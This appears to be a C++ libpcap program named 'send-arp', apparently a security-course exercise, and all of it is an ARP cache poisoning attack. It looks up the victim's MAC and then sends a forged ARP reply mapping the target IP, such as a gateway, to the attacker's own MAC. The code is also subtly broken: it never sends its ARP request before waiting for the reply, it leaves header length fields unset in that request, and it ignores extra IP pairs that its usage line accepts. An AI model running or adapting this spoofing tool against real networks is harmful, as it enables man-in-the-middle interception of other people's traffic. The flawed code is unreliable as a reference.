#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


int getMACAddress(const char* interfaceName, unsigned char* macAddress) {
    int sockfd;
    struct ifreq ifr;

    // 소켓 생성
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return -1;
    }

    // 인터페이스 이름 설정
    strncpy(ifr.ifr_name, interfaceName, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    // MAC 주소 가져오기
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(sockfd);
        return -1;
    }

    // MAC 주소 복사
    memcpy(macAddress, ifr.ifr_hwaddr.sa_data, 6);

    close(sockfd);
    return 0;
}

int getIPAddress(const char* interfaceName, char* ipAddress) {
    int sockfd;
    struct ifreq ifr;

    // 소켓 생성
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return -1;
    }

    // 인터페이스 이름 설정
    strncpy(ifr.ifr_name, interfaceName, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    // IP 주소 가져오기
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl");
        close(sockfd);
        return -1;
    }

    // IP 주소 문자열로 변환
    struct sockaddr_in* addr_in = (struct sockaddr_in*)&ifr.ifr_addr;
    const char* ip = inet_ntoa(addr_in->sin_addr);
    strncpy(ipAddress, ip, INET_ADDRSTRLEN - 1);
    ipAddress[INET_ADDRSTRLEN - 1] = '\0';

    close(sockfd);
    return 0;
}

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}


int main(int argc, char* argv[]) {
	if (argc < 4 || (argc % 2) != 0) {
		usage();
		return -1;
	}	

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	EthArpPacket packet;
	
	unsigned char macAddress[6];
	const char* interfaceName = argv[1];
	char my_mac[18];
    int result = getMACAddress(interfaceName, macAddress);
    if (result == 0) {
		sprintf(my_mac, "%02X:%02X:%02X:%02X:%02X:%02X",
        macAddress[0], macAddress[1], macAddress[2],
        macAddress[3], macAddress[4], macAddress[5]);
		printf("%s\n",my_mac);
	}
	else {
        printf("Failed to get MAC Address.\n");
    }
	
	char ipAddress[INET_ADDRSTRLEN];
	if (getIPAddress(interfaceName, ipAddress) == 0) {
        printf("IP Address: %s\n", ipAddress);
    } else {
        printf("Failed to get IP address.\n");
    }

	char target_mac[ETH_ALEN];


	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(my_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac);
	packet.arp_.sip_ = htonl(Ip(argv[3]));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(argv[2]));
	
	while (true) {
			struct pcap_pkthdr* header;
			const u_char* reply_packet;
			int result = pcap_next_ex(handle, &header, &reply_packet);
			if (result != 1) {
				continue;
			}

			EthArpPacket* reply = (EthArpPacket*)reply_packet;

			if (ntohs(reply->eth_.type_) == EthHdr::Arp && ntohs(reply->arp_.op_) == ArpHdr::Reply &&
				reply->arp_.sip_ == packet.arp_.tip_ && reply->arp_.tip_ == packet.arp_.sip_) {
				strcpy(target_mac, std::string(reply->arp_.smac_).c_str());
				printf("Found target MAC address: %s\n", std::string(reply->arp_.smac_).c_str());
				break;
			}
		}

// arp-send
	packet.eth_.dmac_ = Mac(target_mac);
	packet.eth_.smac_ = Mac(my_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(my_mac);
	packet.arp_.sip_ = htonl(Ip(argv[3]));
	packet.arp_.tmac_ = Mac(target_mac);
	packet.arp_.tip_ = htonl(Ip(argv[2]));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
